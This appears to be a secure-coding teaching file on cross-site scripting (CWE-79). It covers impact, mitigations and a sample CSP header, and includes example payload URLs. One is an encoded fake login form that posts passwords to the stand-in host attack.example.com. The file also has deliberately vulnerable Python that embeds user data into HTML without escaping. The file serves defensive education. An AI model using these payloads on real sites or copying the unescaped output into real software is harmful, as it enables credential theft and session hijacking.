# ============================================================================
# PROBLEM
# ============================================================================

# Failure to neutralize correctly user-controllable input before it is placed
# in output that is used as a web page that is served to other users.
#
# This causes Cross-Site Scripting (XSS) vulnerabilities, including reflected,
# stored, and DOM-based XSS. DOM-based XSS occurs when a client-side application
# performs the injection of XSS into the page by manipulating the Document Object
# Model (DOM).


# ============================================================================
# IMPACT
# ============================================================================

# - Arbitrary JavaScript code executed in the context of victim's browser session.
# - Disclosure of sensitive information, such as cookies or session tokens.
# - Session hijacking, allowing attackers to impersonate victims.
# - Defacement of web pages, leading to loss of trust and credibility.
# - Distribution of malware through malicious scripts.


# ============================================================================
# MITIGATIONS
# ============================================================================

# Understand the context in which your data will be used and the encoding that
# will be expected. Study all expected communication protocols and data
# representations to determine the required encoding strategies.
#
# Understand all the potential areas where untrusted inputs can enter your
# software (e.g., parameters or arguments, cookies, anything read from the
# network, environment variables).


# ============================================================================
# CODE-LEVEL FIXES
# ============================================================================

# Use vetted libraries, frameworks, or tools that automatically:
#   1) Perform context-appropriate output encoding or escaping.
#   2) Enforce parameterization (separation between data and code).
#
#   Ensure that the tools are properly configured and used consistently throughout
#   the application. Example: Using React's dangerouslySetInnerHTML property is bad.
#   Don't rely on developers to program these protections at every point where output is generated.
#
#   3) Set session cookie to HttpOnly to prevent the user's session cookie from
#      being accessible to malicious client-side scripts.
#      Note: Not all browsers support HttpOnly, and there are powerful browser
#      technologies that provide read access to HTTP headers, including the
#      Set-Cookie header in which the HttpOnly flag is set.
#
#   4) Assume all input is malicious. Use an "accept known good" input validation
#      strategy, i.e., use a list of acceptable inputs that strictly conform to
#      specifications. Reject any input that does not strictly conform to
#      specifications, or transform it into something that does.
#
#       Identify potential edge cases.
#       Example: Input validation that checks only for lower-case "script" string
#       but not upper-case "SCRIPT".
#
#   5) Implement Content Security Policy (CSP) headers as a defense-in-depth
#      mechanism. CSP restricts which scripts can execute and where resources
#      can be loaded from, significantly limiting the impact of XSS attacks.
#
#       Example CSP header:
#       Content-Security-Policy: default-src 'self'; script-src 'self';
#       object-src 'none'; style-src 'self' 'unsafe-inline'
#
#       - Blocks inline scripts and eval() by default
#       - Only allows scripts from the same origin
#       - Prevents execution of injected malicious scripts even if XSS exists
#       - Use 'nonce' or 'hash' for legitimate inline scripts when needed
#
#       Note: CSP is not a substitute for proper input validation and output
#       encoding, but provides an important additional layer of protection.


# ============================================================================
# EXAMPLE - Unsafe URLs that could be used to exploit XSS vulnerabilities:
# ============================================================================

# URL-encoded XSS payload: harmless in transit, but becomes dangerous if the server decodes
# and reflects it without proper output encoding (common XSS/WAF bypass technique)
# https://examples.com/auth/login?q%3Cscript%3Ealert(%27test%27)%3C/script%3E

# Raw XSS payload: literal HTML/JS in the query string that will execute immediately
# if reflected into the response without context-aware output encoding
# https://examples.com/auth/login?query=<script>alert('test');</script>

# Obsfucated example that would display fake login box appearing on a legitimate page.
# https://examples.com/auth/login??username=%3Cdiv+id%3D%22stealPassword%22%3EPlease+Login%3A%3Cform+name%3D%22
# input%22+action%3D%22http%3A%2F%2Fattack.example.com%2FstealPassword.php%22+method%3D%22post%22%3EUsername%3A
# +%3Cinput+type%3D%22text%22+name%3D%22username%22+%2F%3E%3Cbr%2F%3EPassword%3A+%3Cinput+type%3D%22password%22
# +name%3D%22password%22+%2F%3E%3Cinput+type%3D%22submit%22+value%3D%22Login%22+%2F%3E%3C%2Fform%3E%3C%2Fdiv%3E%0D%0A

# ----------------------------------------------------------------------------
# EXAMPLE: Stored XSS (Type 2)
# ----------------------------------------------------------------------------

# The following code consists of two separate pages in a web application, one
# devoted to creating user accounts and another devoted to listing active users
# currently logged in. It also displays a Stored XSS (Type 2) scenario.

# --- create_user.py (BAD CODE) ---

import sqlite3
import hashlib


def create_user(username, password, full_name):
    """
    This code is careful to avoid a SQL injection attack (CWE-89) by using
    parameterized queries, but does not stop valid HTML from being stored in
    the database. This can be exploited later when list_users() retrieves
    the information.
    """
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()

    # Parameterized query prevents SQL injection
    password_hash = hashlib.sha256(password.encode()).hexdigest()
    query = "INSERT INTO users (username, password, fullname) VALUES (?, ?, ?)"
    cursor.execute(query, (username, password_hash, full_name))

    conn.commit()
    conn.close()


# --- list_users.py (BAD CODE) ---


def list_users():
    """
    Retrieves and displays active users WITHOUT HTML escaping.
    This allows stored XSS attacks.
    """
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()

    query = "SELECT * FROM users WHERE loggedIn=1"
    results = cursor.execute(query)

    if not results:
        return

    # Print list of users to page (VULNERABLE: no HTML escaping)
    html_output = '<div id="userlist">Currently Active Users:'
    for row in results:
        # VULNERABILITY: Directly embedding user data without escaping
        html_output += f'<div class="userNames">{row["fullname"]}</div>'
    html_output += "</div>"

    conn.close()
    return html_output


# EXPLANATION:
# The attacker can set their name to be arbitrary HTML, which will then be
# displayed to all visitors of the Active Users page. This HTML can, for
# example, be a password-stealing login form.
